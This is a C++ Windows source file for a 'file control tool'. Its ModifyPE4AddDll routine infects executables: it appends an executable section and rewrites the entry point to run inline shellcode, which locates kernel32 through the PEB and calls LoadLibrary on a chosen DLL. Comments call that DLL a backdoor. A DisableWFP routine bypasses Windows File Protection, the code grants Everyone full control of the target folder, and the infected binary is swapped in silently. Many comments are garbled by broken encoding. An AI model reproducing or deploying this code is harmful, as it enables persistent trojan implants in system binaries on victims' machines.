
#include "SystemInfo.h"
#include "FileControlTool.h"
#include <process.h>

#pragma warning(disable:4731) // ����ʾ4731�ž�����Ϣ

//////////////////////////////////////////////////////////////////////////
// Ĭ�ϻص�����

bool CallbackFindFolder(LPCTSTR lpFilePath,LPCTSTR lpFileName,PVOID pParameter)
{
	return FALSE;
}

bool CallbackFindFile(LPCTSTR lpFilePath,LPCTSTR lpFileName,PVOID pParameter)
{
	return FALSE;
}

CFileControlTool::CFileControlTool(void)
{
}

CFileControlTool::CFileControlTool(LPCTSTR lpLogFileName): CCommonControl(lpLogFileName)
{

}


CFileControlTool::~CFileControlTool(void)
{

}


// From device file name to DOS filename   ���豸�ļ���ת��ΪDOS�ļ���
DWORD CFileControlTool::GetFsFileName(LPCTSTR pszDeviceFileName,LPTSTR pszfsFileName,DWORD dwManLen)
{   
	DWORD dwRet = 0;   

	TCHAR szDeviceName[MAX_NAME_DRIVER_LEN];   
	TCHAR lpDrive[3] = _T("A:");   

	// Iterating through the drive letters   
	for ( TCHAR actDrive = _T('A'); actDrive <= _T('Z'); actDrive++ )   
	{   
		lpDrive[0] = actDrive;   

		// Query the device for the drive letter   
		if ( QueryDosDevice(lpDrive, szDeviceName,MAX_NAME_DRIVER_LEN) != 0)   
		{   
			// Network drive?   
			if (_tcsnicmp(_T("\\Device\\LanmanRedirector\\"),szDeviceName,25) == 0)   
			{   
				//Mapped network drive    

				char cDriveLetter;   
				DWORD dwParam;   

				TCHAR lpSharedName[MAX_NAME_DRIVER_LEN];   

				if (_stscanf(szDeviceName,_T("\\Device\\LanmanRedirector\\;%c:%d\\%s"),&cDriveLetter,&dwParam,lpSharedName) != 3)   
					continue;   

				_tcscpy(szDeviceName,_T("\\Device\\LanmanRedirector\\"));   
				_tcscat(szDeviceName,lpSharedName);   
			}   

			// Is this the drive letter we are looking for?   
			if (_tcsnicmp(szDeviceName,pszDeviceFileName,_tcslen( szDeviceName )) == 0)   
			{   
				_tcscpy_s(pszfsFileName,dwManLen,lpDrive);   
				_tcscat_s(pszfsFileName,dwManLen,(LPCTSTR)(pszDeviceFileName + _tcslen(szDeviceName)));   

				dwManLen = TRUE;   

				break;   
			}   
		}   
	}   

	return dwManLen;   
}   

// From DOS file name to device file name   ��DOS�ļ���ת��Ϊ�豸�ļ���
DWORD CFileControlTool::GetDeviceFileName(LPCTSTR pszFsFileName,LPTSTR pszDeviceFileName,DWORD dwMaxLen)
{   
	DWORD dwRet = 0;   
	TCHAR lpDrive[3];   

	// ��ȡ�������̷�
	// �ź���������������DOS�ļ���  
	_tcsncpy(lpDrive, pszFsFileName,2);   
	lpDrive[2] = _T('\0');   

	TCHAR szDeviceName[MAX_NAME_DRIVER_LEN+1];   

	// Query the device for the drive letter   
	if ( QueryDosDevice(lpDrive,szDeviceName,MAX_NAME_DRIVER_LEN) != 0 )   
	{   
		// Subst drive? ����Ƿ�Ϊ����������
		if (_tcsnicmp( _T("\\??\\"), szDeviceName, 4 ) == 0)   
		{   
			_tcscpy_s(pszDeviceFileName,dwMaxLen,szDeviceName + 4);
			_tcscat_s(pszDeviceFileName,dwMaxLen,pszFsFileName + 2);
			//pszDeviceFileName = szDeviceName + 4;   
			//pszDeviceFileName += pszFsFileName + 2;   

			return _tcslen(pszDeviceFileName);   
		}   
		else   
			// Network drive?   ����Ƿ�Ϊ����������
			if (_tcsnicmp(_T("\\Device\\LanmanRedirector\\"),szDeviceName,25) == 0)   
			{   
				//Mapped network drive    ӳ������������

				char cDriveLetter;   
				DWORD dwParam;   

				TCHAR lpSharedName[0x1000];   

				if (_stscanf(szDeviceName,_T("\\Device\\LanmanRedirector\\;%c:%d\\%s"),&cDriveLetter,&dwParam,lpSharedName ) != 3)   
					return FALSE;   

				_tcscpy(szDeviceName,_T("\\Device\\LanmanRedirector\\"));   
				_tcscat(szDeviceName,lpSharedName);   
			}

			_tcscat( szDeviceName,pszFsFileName + 2);   

			_tcscpy_s(pszDeviceFileName,dwMaxLen,szDeviceName);   

			dwRet = _tcslen(pszDeviceFileName);   
	}   

	return dwRet;
}   


BOOL OperatePrivilege4Process(LPCTSTR pPrivName, BOOL bEnable)
{
	BOOL bReturn = FALSE;
	HANDLE hToken = NULL;
	LUID uidName = {0};
	TOKEN_PRIVILEGES tpToken = {0};
	DWORD dwReturn = 0;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return bReturn;

	if (!LookupPrivilegeValue(NULL, pPrivName, &uidName))
	{
		CloseHandle(hToken);
		return bReturn;
	}

#ifndef SE_PRIVILEGE_REMOVED
#define SE_PRIVILEGE_REMOVED            (0X00000004L)
#endif

	tpToken.PrivilegeCount = 1;
	tpToken.Privileges[0].Luid = uidName;
	tpToken.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

	bReturn = AdjustTokenPrivileges(hToken, FALSE, &tpToken, sizeof(TOKEN_PRIVILEGES), NULL, &dwReturn);

	CloseHandle(hToken);

	return bReturn;
	/*
	NTSTATUS RtlAdjustPrivilege
	(
	DWORD    Privilege,
	BOOLEAN Enable,
	BOOLEAN CurrentThread,
	PBOOLEAN Enabled
	)
	�����ĺ��壺
	Privilege [In] Privilege index to change.                        
	// ����Ҫ��Ȩ�����ƣ����Ե� MSDN ���ҹ��� Process Token & Privilege ���ݿ��Բ鵽

	Enable [In] If TRUE, then enable the privilege otherwise disable.
	// ���ΪTrue ���Ǵ���ӦȨ�ޣ����ΪFalse ���ǹر���ӦȨ��

	CurrentThread [In] If TRUE, then enable in calling thread, otherwise process.
	// ���ΪTrue ���������ǰ�߳�Ȩ�ޣ����������������̵�Ȩ��

	Enabled [Out] Whether privilege was previously enabled or disabled.
	// ���ԭ����ӦȨ�޵�״̬���� | �رգ�

	���� SE_BACKUP_PRIVILEGE = 0x11h
	���� SE_RESTORE_PRIVILEGE = 0x12h
	���� SE_SHUTDOWN_PRIVILEGE = 0x13h
	���� SE_DEBUG_PRIVILEGE = 0x14h
	*/
}

bool CFileControlTool::DisableWFP(LPTSTR pszFileName)
{
	bool bRetval = FALSE;
	OSVERSIONINFO osviVersionInfo;

	ZeroMemory(&osviVersionInfo, sizeof(OSVERSIONINFO));
	osviVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osviVersionInfo);
	if (osviVersionInfo.dwMajorVersion == 5 && osviVersionInfo.dwMinorVersion == 1)
	{
		typedef DWORD(__stdcall *CPP) (DWORD param1, PWCHAR param2, DWORD param3);

		HINSTANCE hMod = LoadLibrary(_T("sfc_os.dll"));
		if(!hMod)return FALSE;

		CPP SetSfcFileException = (CPP)GetProcAddress(hMod, (LPCSTR)5);

		bRetval = SetSfcFileException(0,(wchar_t *)t2ws(pszFileName).c_str(), -1);

	}else if (osviVersionInfo.dwMajorVersion == 6 && osviVersionInfo.dwMinorVersion == 1)
	{	
		PSID pSIDAdmin = NULL;
		PSID pSIDEveryone = NULL;
		PACL pACL = NULL;

		do 
		{
			SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
			SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
			const int NUM_ACES  = 2;
			EXPLICIT_ACCESS ea[NUM_ACES];
			DWORD dwRes;
			// Specify the DACL to use.
			// Create a SID for the Everyone group.
			if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,SECURITY_WORLD_RID,0,0, 0, 0, 0, 0, 0,&pSIDEveryone)) 
			{
				//printf("AllocateAndInitializeSid (Everyone) error %u\n",GetLastError());
				break;
			}
			// Create a SID for the BUILTIN\Administrators group.
			if (!AllocateAndInitializeSid(&SIDAuthNT, 2,SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0,&pSIDAdmin)) 
			{
				//printf("AllocateAndInitializeSid (Admin) error %u\n",GetLastError());
				break;
			}
			ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));
			// Set read access for Everyone.
			ea[0].grfAccessPermissions = GENERIC_READ;
			ea[0].grfAccessMode = SET_ACCESS;
			ea[0].grfInheritance = NO_INHERITANCE;
			ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
			ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
			ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;
			// Set full control for Administrators.
			ea[1].grfAccessPermissions = GENERIC_ALL;
			ea[1].grfAccessMode = SET_ACCESS;
			ea[1].grfInheritance = NO_INHERITANCE;
			ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
			ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
			ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;
			if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES,ea,NULL,&pACL))
			{
				//printf("Failed SetEntriesInAcl\n");
				break;
			}
			// Try to modify the object's DACL.
			dwRes = SetNamedSecurityInfo(pszFileName,SE_FILE_OBJECT,DACL_SECURITY_INFORMATION,NULL, NULL,pACL,NULL);
			if (ERROR_SUCCESS == dwRes) 
			{
				//printf("Successfully changed DACL\n");
				bRetval = TRUE;// No more processing needed.
				break;
			}
			if (dwRes != ERROR_ACCESS_DENIED)
			{
				//printf("First SetNamedSecurityInfo call failed: %u\n",dwRes); 
				break;
			}
			// If the preceding call failed because access was denied, 
			// enable the SE_TAKE_OWNERSHIP_NAME privilege, create a SID for 
			// the Administrators group, take ownership of the object, and 
			// disable the privilege. Then try again to set the object's DACL.
			// Open a handle to the access token for the calling process.
			// Enable the SE_TAKE_OWNERSHIP_NAME privilege.
			if (!OperatePrivilege4Process(SE_TAKE_OWNERSHIP_NAME, TRUE)) 
			{
				//printf("You must be logged on as Administrator.\n");
				break;
			}
			// Set the owner in the object's security descriptor.
			dwRes = SetNamedSecurityInfo(pszFileName,SE_FILE_OBJECT,OWNER_SECURITY_INFORMATION,pSIDAdmin,NULL,NULL,NULL);
			if (dwRes != ERROR_SUCCESS) 
			{
				//printf("Could not set owner. Error: %u\n", dwRes); 
				break;
			}

			// Disable the SE_TAKE_OWNERSHIP_NAME privilege.
			if (!OperatePrivilege4Process(SE_TAKE_OWNERSHIP_NAME, FALSE)) 
			{
				//printf("Failed SetPrivilege call unexpectedly.\n");
				break;
			}
			// Try again to modify the object's DACL,
			// now that we are the owner.
			dwRes = SetNamedSecurityInfo(pszFileName,SE_FILE_OBJECT,DACL_SECURITY_INFORMATION,NULL, NULL,pACL,NULL);                       // do not change SACL
			if (dwRes == ERROR_SUCCESS)
			{
				//printf("Successfully changed DACL\n");
				bRetval = TRUE; 
			}
			else
			{
				//printf("Second SetNamedSecurityInfo call failed: %u\n",dwRes); 
			}
		} while (FALSE);

		if (pSIDAdmin)
			FreeSid(pSIDAdmin);
		if (pSIDEveryone)
			FreeSid(pSIDEveryone);
		if (pACL)
			LocalFree(pACL);
	}

	return bRetval;
}

bool CFileControlTool::ModifyPE4AddDll(LPCTSTR lpPEFileName,LPCSTR pszDllFileName)
{
	bool bReturn = FALSE;
	IMAGE_DOS_HEADER tDosHeader;
	IMAGE_NT_HEADERS tNtHeader;
	IMAGE_SECTION_HEADER tSectionHeaderOld, tSectionHeaderNew;  //�����ӵĽڵĽ�ͷ
	int nSections, nFileAlignMent, nSectionAlignMent;
	FILE * pNewFile = NULL;
	int i,extraLengthAfterAlign;
	unsigned long oldEP = 0,newEP = 0,uBackUp = 0; //����ڵ�
	TCHAR * pExtra_data;
	int extra_data_real_length;

	TCHAR szFullPathFileName[MAX_PATH + 1];
	szFullPathFileName[MAX_PATH] = NULL;
	TCHAR szArguments[MAX_PATH + 1];
	szArguments[MAX_PATH] = NULL;
	TCHAR szFullPathFileNameNew[MAX_PATH + 1];
	szFullPathFileNameNew[MAX_PATH] = NULL;

	OutA(OutputsA,"Modify PE File Add Dll(%s) Dependencies Starting.",pszDllFileName);

	_tcscpy(szFullPathFileName,lpPEFileName);
	_tcscpy(szFullPathFileNameNew, szFullPathFileName);
	_tcscat(szFullPathFileNameNew, _T(".dat"));

	Out(Outputs,_T("Target Modify File Name Is [%s]."),lpPEFileName,szFullPathFileNameNew);
	do 
	{
		if(_tcschr(szFullPathFileName, _T('\\')))
		{
			_tcscpy(szArguments, szFullPathFileName);
			*_tcsrchr(szArguments, _T('\\')) = NULL;
		}
		else
		{
			GetCurrentDirectory(MAX_PATH, szArguments);
		}
		EnableAccountPrivilege(szArguments,_T("Everyone"),GENERIC_ALL,SET_ACCESS,SE_FILE_OBJECT);
		//SetAccountPrivilege4File(szArguments, true);
		//����һ��
		if(!CopyFile(szFullPathFileName, szFullPathFileNameNew, FALSE))
		{
			Out(Errors,_T("CopyFile(szFullPathFileName=%s, szFullPathFileNameNew=%s) Failed."), szFullPathFileName, szFullPathFileNameNew);
			break;
		}

		pNewFile = _tfopen(szFullPathFileNameNew, _T("rb+"));//�����ļ����ļ���Ϊԭ�����ļ��� + .exe
		if(NULL == pNewFile)
		{
			Out(Errors,_T("Open File %s Failed."), szFullPathFileNameNew);
			break;
		}

		fseek(pNewFile, 0, SEEK_SET);//�ƶ��ļ�ָ�뵽�ļ�ͷ
		//��ȡIMAGE_DOS_HEADER
		if(!fread(&tDosHeader, sizeof(IMAGE_DOS_HEADER), 1, pNewFile))
		{
			Out(Errors,_T("Fread IMAGE_DOS_HEADER Failed."));
			break;
		}
		if (tDosHeader.e_magic != IMAGE_DOS_SIGNATURE)//���DOSͷ��Ч
		{
			Out(Errors,_T("Check IMAGE_DOS_SIGNATURE Failed! Dos Header Signature is %X."), tDosHeader.e_magic);
			break;
		}

		fseek(pNewFile, tDosHeader.e_lfanew, SEEK_SET); //�ȶ�λ��pe�ļ�ͷ,ƫ��tDosHeader.e_magic��ȡIMAGE_NT_HEADERS
		//�õ�NTͷ
		if(!fread(&tNtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile))
		{
			Out(Errors,_T("Fread IMAGE_NT_HEADERS Failed."));
			break;
		}
		if (tNtHeader.Signature != IMAGE_NT_SIGNATURE)//���NTͷ��Ч
		{
			Out(Errors,_T("Check IMAGE_NT_SIGNATURE Failed! PE Header Signature is %X."), tNtHeader.Signature);
			break;
		}

		if (tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0 ||
			tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0)//������������Ŀ¼�Ƿ����
		{
			Out(Outputs,_T("Input Table Virtual Address is%p,Size is %u"), 
				tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, 
				tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
			break;
		}
		//��������ļ������Ǳ�����������--�Ϸ���PE�ļ�
		nSections = tNtHeader.FileHeader.NumberOfSections;//��ȡ�ļ�������
		nFileAlignMent = tNtHeader.OptionalHeader.FileAlignment; //��ȡ�ļ�����
		nSectionAlignMent = tNtHeader.OptionalHeader.SectionAlignment;//�ڶ��뷽ʽ
		oldEP = tNtHeader.OptionalHeader.AddressOfEntryPoint;  //����ԭ������ڵ�ַ����
		Out(Outputs,_T("File Alignment is %u,Section Alignment is %u,Old Entry Address=0x%p."), nFileAlignMent, nSectionAlignMent, oldEP);

		uBackUp = sizeof(oldEP);

		for(i = 0; i < nSections; i++)   //��λ�����һ����ͷ
		{
			fread(&tSectionHeaderOld, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile);
			OutA(OutputsA,"Old SectionHeader Name For The Index is %d: %s.", i, tSectionHeaderOld.Name);
			if(!strnicmp((const char *)tSectionHeaderOld.Name, SECTION_NAME, strlen(SECTION_NAME)))
			{
				Out(Warning,_T("PE File Has Been Added Dll Dependencies."));

				newEP = tSectionHeaderOld.VirtualAddress;

				fseek(pNewFile, tSectionHeaderOld.PointerToRawData, SEEK_SET);//��λ���½ڵĿ�ͷ

				fread(&oldEP,sizeof(oldEP),1,pNewFile);

				fseek(pNewFile, tSectionHeaderOld.PointerToRawData, SEEK_SET);//��λ���½ڵĿ�ͷ

				if(!fwrite(&oldEP,uBackUp, 1, pNewFile))
				{
					Out(Errors,_T("Old Entrance Process is 0x%p ,Backup Entrance Process Failed."),oldEP);
					bReturn = false;
					break;
				}

				goto GetExtraData;
			}
		}

		if(i != nSections)
			break;

		//����һ���½�ǰ��׼������
		extraLengthAfterAlign = roundup(EXTRA_CODE_LENGTH, nFileAlignMent);
		tNtHeader.FileHeader.NumberOfSections++; //�ڵ�������һ
		ZeroMemory(&tSectionHeaderNew, sizeof(IMAGE_SECTION_HEADER));//������
		//������������
		strncpy((char *)tSectionHeaderNew.Name, SECTION_NAME, IMAGE_SIZEOF_SHORT_NAME); //д�����
		//ͨ������ڷ�ʽ,����VirtualAddress
		tSectionHeaderNew.VirtualAddress = roundup(tSectionHeaderOld.VirtualAddress + tSectionHeaderOld.Misc.VirtualSize, nSectionAlignMent);
		//ͨ������ڷ�ʽ,����VirtualSize
		tSectionHeaderNew.Misc.VirtualSize = roundup(extraLengthAfterAlign, nSectionAlignMent);
		//����ԭʼ���ݵ�ָ��
		tSectionHeaderNew.PointerToRawData = roundup(tSectionHeaderOld.PointerToRawData + tSectionHeaderOld.SizeOfRawData, nFileAlignMent);
		//����ԭʼ���ݵĴ�С
		tSectionHeaderNew.SizeOfRawData = roundup(SECTION_SIZE, nFileAlignMent);
		//�޸��½ڵ�����
		tSectionHeaderNew.Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

		//����tNtHeader
		Out(Outputs,_T("Old File Information,Code Size Is %u,Image Size Is %u."), tNtHeader.OptionalHeader.SizeOfCode, tNtHeader.OptionalHeader.SizeOfImage);
		tNtHeader.OptionalHeader.SizeOfCode = roundup(tNtHeader.OptionalHeader.SizeOfCode + SECTION_SIZE, nFileAlignMent); //���������С
		tNtHeader.OptionalHeader.SizeOfImage = tNtHeader.OptionalHeader.SizeOfImage+ roundup(SECTION_SIZE, nSectionAlignMent); //�����ļ���С
		Out(Outputs,_T("New File Information,Code Size Is %u,Image Size Is %u."), tNtHeader.OptionalHeader.SizeOfCode, tNtHeader.OptionalHeader.SizeOfImage);

		//����Ŀ¼ͷ���ٽ�ֵ����Ϊ��
		tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
		tNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;

		fseek(pNewFile, 0, SEEK_END);//�ƶ��ļ�ָ�뵽�ļ�β��
		newEP = tSectionHeaderNew.VirtualAddress;
		Out(Outputs,_T("CSystemExpress::ModifyPE4AddDll oldEP=%p,newEP=%p,ftell(pNewFile)=%p"), oldEP, newEP, ftell(pNewFile));

		tNtHeader.OptionalHeader.AddressOfEntryPoint = newEP + uBackUp;//�޸ĳ�����ڵ�Ϊ�����¼ӽ�
		fseek(pNewFile, tDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + nSections * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);//��λ�ڱ�β��
		OutA(OutputsA,"New SectionHeader Name Is %s.", tSectionHeaderNew.Name);

		//д��������Ľ�ͷ
		if(!fwrite(&tSectionHeaderNew, sizeof(IMAGE_SECTION_HEADER), 1, pNewFile))
		{
			Out(Errors,_T("Fwrite IMAGE_SECTION_HEADER Failed."));
			break;
		}
		//д���������PE�ļ�ͷ(NTͷ)
		fseek(pNewFile, tDosHeader.e_lfanew, SEEK_SET);

		if(!fwrite(&tNtHeader, sizeof(IMAGE_NT_HEADERS), 1, pNewFile))
		{
			Out(Errors,_T("Fwrite IMAGE_NT_HEADERS Failed."));
			break;
		}
		//��λ���ļ�β��
		fseek(pNewFile, 0, SEEK_END);
		//д���½ڣ�������д��0
		for(i = 0; i < roundup(SECTION_SIZE, nFileAlignMent); i++)
		{
			fputc(0, pNewFile);
		}
		fseek(pNewFile, tSectionHeaderNew.PointerToRawData, SEEK_SET);//��λ���½ڵĿ�ͷ

		if(!fwrite(&oldEP,uBackUp, 1, pNewFile))
		{
			Out(Errors,_T("Old Entrance Process is 0x%p ,Backup Entrance Process Failed."),oldEP);
			bReturn = false;
			break;
		}

		goto GetExtraData;

extra_data_start:
/*		_asm	pushad
		//��ȡkernel32.dll�Ļ�ַ
		_asm    mov eax, fs:0x30     ;PEB�ĵ�ַ
		_asm    mov eax, [eax + 0x0c]
		_asm    mov esi, [eax + 0x1c]
		_asm    lodsd
		_asm    mov eax, [eax + 0x08] ;eax����kernel32.dll�Ļ�ַ
		_asm    mov edi, eax    //ͬʱ����kernel32.dll�Ļ�ַ��edi
		*/
		_asm    mov eax,fs:[30h]       ;�õ�PEB�ṹ��ַ
		_asm    mov eax,[eax + 0ch]    ;�õ�PEB_LDR_DATA�ṹ��ַ 
		_asm    mov esi,[eax + 1ch]
next_module:
		_asm    mov   eax,[esi+08h]    ;ȡ�б���ģ���ַ��eax
		_asm    mov   edi,[esi+20h]    ;ȡ����ģ����ִ��׵�ַ��EDI
		_asm    mov   esi,[esi]
//		_asm    cmp  [edi+12*2],cx     ;cx=0 �Ƚ��ִ���β���Ƿ�Ϊ0
		_asm    cmp  [edi+12*2],0x0000     ;cx=0 �Ƚ��ִ���β���Ƿ�Ϊ0
		_asm    jnz  next_module       ;����ö��

		_asm    mov  edi,eax           ;edi������kernel32�Ļ�ַ

		//ͨ������ kernel32.dll�ĵ��������GetProcAddress�����ĵ�ַ
		_asm    mov ebp, eax
		_asm    mov eax, [ebp + 3ch]
		_asm    mov edx, [ebp + eax + 78h]
		_asm    add edx, ebp
		_asm    mov ecx, [edx + 18h]
		_asm    mov ebx, [edx + 20h]
		_asm    add ebx, ebp

search:
		_asm    dec ecx
		_asm    mov esi, [ebx + ecx * 4]

		_asm    add esi, ebp
		_asm    mov eax, 0x50746547
		_asm    cmp [esi], eax      //�Ƚ�"PteG"
		_asm    jne search
		_asm    mov eax, 0x41636f72
		_asm    cmp [esi + 4], eax
		_asm    jne search
		_asm    mov ebx, [edx + 24h]
		_asm    add ebx, ebp
		_asm    mov cx, [ebx + ecx * 2]
		_asm    mov ebx, [edx + 1ch]
		_asm    add ebx, ebp
		_asm    mov eax, [ebx + ecx * 4]
		_asm    add eax, ebp        //eax����ľ���GetProcAddress�ĵ�ַ

		//Ϊ�ֲ���������ռ�
		_asm    push ebp
		_asm    sub esp, 50h
		_asm    mov ebp, esp

		//����LoadLibrary�ĵ�ַ
		_asm    mov [ebp + 40h], eax    //��GetProcAddress�ĵ�ַ���浽ebp + 40��

		//��ʼ����LoadLibrary�ĵ�ַ, �ȹ���"LoadLibrary\0"
		_asm    push 0x0    //��'\0'
		_asm    push DWORD PTR 0x41797261
		_asm    push DWORD PTR 0x7262694c
		_asm    push DWORD PTR 0x64616f4c
		_asm    push esp    //ѹ��"LoadLibrary\0"�ĵ�ַ
		_asm    push edi    //edi:kernel32�Ļ�ַ
		_asm    call [ebp + 40h]    //����ֵ(��LoadLibrary�ĵ�ַ)������eax��
		_asm    mov [ebp + 44h], eax    //����LoadLibrary�ĵ�ַ��ebp + 44h
		_asm    push 0x00
/*		_asm    push DWORD PTR 0x6769666E   //"nfig"
		_asm    push DWORD PTR 0x6F63736F   //"osco"
		_asm    push DWORD PTR 0x44444444   //"nfig"
		_asm    push DWORD PTR 0x44444444   //"osco"
		_asm    push DWORD PTR 0x44444444//6769666E   //"nfig"
		_asm    push DWORD PTR 0x44444444//6F63736F   //"osco"*/
		_asm    push esp                    //�ַ���"BackDoor"�ĵ�ַ
		_asm    call [ebp + 44h]    //����call eax
		_asm    mov esp, ebp
		_asm    add esp, 0x50
		_asm    popad
extra_data_end:

GetExtraData:
		_asm pushad;
		_asm lea eax, extra_data_start;
		_asm mov pExtra_data, eax;
		_asm lea edx, extra_data_end;
		_asm sub edx, eax;
		_asm mov extra_data_real_length, edx;
		_asm popad;

		//д�븽������(��������DLLľ��)
		//����Dll����
		//LPCSTR lpDllName =(LPCSTR) pExtra_data + 118;
		//memset(pExtra_data + 118,0,20);
		//PVOID pData = malloc(0x1000);
		//memcpy(pData,pExtra_data, 0x76);
#define PUSH_STRING_OFFSET			0x7F

		if(PUSH_STRING_OFFSET != fwrite(pExtra_data, 1, PUSH_STRING_OFFSET, pNewFile))
		{
			Out(Errors,_T("Write File Failed,PUSH_STRING_OFFSET = %d."),PUSH_STRING_OFFSET);
			break;
		}

		extra_data_real_length = PUSH_STRING_OFFSET;

		DWORD dwFileNameLen = strlen(pszDllFileName);
		DWORD dwForMax = dwFileNameLen/4;
		DWORD dwRemainder = dwFileNameLen % 4;

		if (0 == dwRemainder)
		{
			dwRemainder = 4;
		}
		else
		{
			dwForMax ++;
			dwFileNameLen += 4 - dwRemainder;
		}

		CHAR szWriteData[5] = {104,0,0,0,0}; // 104 0x68 push ѹ��32λ�Ĵ���������

		for (int i = 0; i < dwForMax; i++)
		{

			if (0 == i)
				strncpy(&szWriteData[1],&pszDllFileName[dwFileNameLen-(i * 4 + 4)],dwRemainder);
			else
				strncpy(&szWriteData[1],&pszDllFileName[dwFileNameLen-(i * 4 + 4)],4);

			if(5 != fwrite(szWriteData, 1, 5, pNewFile))
			{
				Out(Errors,_T("Write File Failed,Extra Data Length = %d."),extra_data_real_length);
				break;
			}
			extra_data_real_length += 5;
		}

		if(0xA != fwrite((PVOID)((ULONG)pExtra_data + PUSH_STRING_OFFSET), 1, 0xA, pNewFile))
		{
			Out(Errors,_T("Write File Failed,Extra Data Length = %d."),extra_data_real_length);
			break;
		}

		extra_data_real_length += 0xA;

		oldEP -= newEP + extra_data_real_length + 5 + uBackUp;
		Out(Outputs,_T("Corrected Ord Entry Address = 0x%08X"), oldEP);

		BYTE jmp = 0xE9;
		fwrite(&jmp, sizeof(jmp), 1, pNewFile);
		fwrite(&oldEP, sizeof(oldEP), 1, pNewFile);
		bReturn = TRUE;
	} while (FALSE);

	if(pNewFile)
		fclose(pNewFile);

	if(bReturn)
	{
		_tcscpy(szArguments, szFullPathFileName);
		_tcscat(szArguments, _T(".tmp"));

		DisableWFP(szFullPathFileName);
		MoveFileEx(szFullPathFileName, szArguments, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
		MoveFileEx(szFullPathFileNameNew, szFullPathFileName, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
		DeleteFile(szArguments);
	}
	else
		DeleteFile(szFullPathFileNameNew);

	Runend(bReturn,_T("Modify PE File Add Dll Dependencies Stoping."));
	return bReturn;
}

bool CFileControlTool::RemoveFile(LPCTSTR lpFileName,bool bForce /* = false */)
{
	TCHAR szFullPathName[_MAX_PATH];  
	BOOL bRet = FALSE;

	//Enable debug privilege   
	EnableDebugPriv();   

	//Get the full path  
	
	if ( GetFullPathName( lpFileName, _MAX_PATH, szFullPathName, NULL ) == 0 )   
	{   
		Out(Dbg,_T("RemoveFile Failed. Error = %d\n"),GetLastError());   
		return FALSE;   
	}   
	

	//Close every handle in the system for this file   
	if (bForce) 
		bRet = CloseRemoteFileHandles(szFullPathName); 
	else
		bRet = DeleteFile(szFullPathName); 

	return bRet;   
}

bool CFileControlTool::RenameFile(LPCTSTR lpFileName,LPCTSTR lpNewFileName,bool bForce /* = false */)
{
	TCHAR szFullPathName[_MAX_PATH];  
	BOOL bRet = FALSE;

	//Enable debug privilege   
	EnableDebugPriv();   

	//Get the full path
	if (GetFullPathName(lpFileName,MAX_PATH,szFullPathName,NULL) == 0)   
	{   
		Out(Dbg,_T("RemoveFile Failed. Error = %d\n"),GetLastError());   
		return FALSE;   
	}

	//Close every handle in the system for this file   
	if (bForce) 
		bRet = CloseRemoteFileHandles(szFullPathName); 
	
	bRet = ::MoveFileEx(szFullPathName,lpNewFileName,MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH | MOVEFILE_COPY_ALLOWED); 

	return bRet;   
}

ULONGLONG CFileControlTool::FindFiles(LPCTSTR lpFilePath,LPCTSTR lpFileName,PFINDFILE pCallbackFindFile /* = NULL */,PFINDFOLDER pCallbackFindFolder /* = NULL */,BOOL bFuzzy /* = FALSE */,BOOL bDirectory /* = FALSE */,PVOID pFileParameter /* = NULL */,PVOID pDirectoryParameter /* = NULL */)
{ 
	ULONGLONG    uCountFolder(0); 
	ULONGLONG    uCountFile(0); 
	if (NULL == pCallbackFindFile || NULL == pCallbackFindFolder)
	{
		if (NULL == pCallbackFindFile && NULL == pCallbackFindFolder)
			InternalFindFolder(lpFilePath, lpFileName, uCountFolder, uCountFile,CallbackFindFile,CallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter);
		else if (NULL == pCallbackFindFile)
			InternalFindFolder(lpFilePath, lpFileName, uCountFolder, uCountFile,CallbackFindFile,pCallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter);
		else
			InternalFindFolder(lpFilePath, lpFileName, uCountFolder, uCountFile,pCallbackFindFile,CallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter);

		return uCountFolder + uCountFile; 
	}
	InternalFindFolder(lpFilePath, lpFileName, uCountFolder, uCountFile,pCallbackFindFile,pCallbackFindFolder,bFuzzy,bDirectory,pFileParameter,pDirectoryParameter); 

	return uCountFolder + uCountFile; 
} 

